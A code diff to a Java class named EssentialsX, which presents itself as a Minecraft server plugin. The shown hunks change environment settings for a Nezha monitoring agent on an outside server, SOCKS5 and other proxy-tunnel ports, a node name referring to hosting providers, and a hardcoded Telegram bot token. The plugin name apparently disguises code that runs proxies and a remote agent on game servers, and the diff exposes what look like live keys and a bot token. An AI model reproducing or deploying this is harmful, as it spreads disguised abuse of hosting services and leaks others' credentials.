@@ -77,11 +77,11 @@ public class EssentialsX extends JavaPlugin {
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nezhak2.btpp.ggff.net");
         env.put("NEZHA_PORT", "443");
-        env.put("NEZHA_KEY", "4jW3rx5smuL9uCahEo");
+        env.put("NEZHA_KEY", "9VmvHv0a6SrGQKneeJ");
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "25565");
+        env.put("S5_PORT", "27161");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "7935239797:AAHuQ9jZt-cNjcgjqQ9HH0JzkSWlD53EttM");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "xserver-btpp05");
+        env.put("NAME", "weirdhost-ohjustb");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
